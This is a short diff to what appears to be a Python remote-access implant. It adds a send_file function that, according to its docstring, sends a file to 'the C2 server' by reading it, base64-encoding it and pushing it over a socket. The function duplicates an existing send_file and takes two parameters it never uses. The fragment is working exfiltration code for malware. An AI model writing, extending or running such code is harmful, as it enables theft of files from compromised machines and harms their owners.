@@ -485,3 +485,16 @@ def send_file(socket, file_name):
     except:
         socket.sendall(base64_encode(b"[-] File not found"))
 
+def send_file(socket, file_name, file_destination, command="upload"):
+    """This function sends a file to the C2 server
+    Args:
+        socket (Socket.Object): The socket to send data to
+        file_name (str): The name of the file to send
+    """
+    try:
+        with open(file_name, "rb") as f:
+            data = f.read()
+            data = base64_encode(data)
+            socket.sendall(data)
+    except:
+        socket.sendall(base64_encode(b"[-] File not found"))
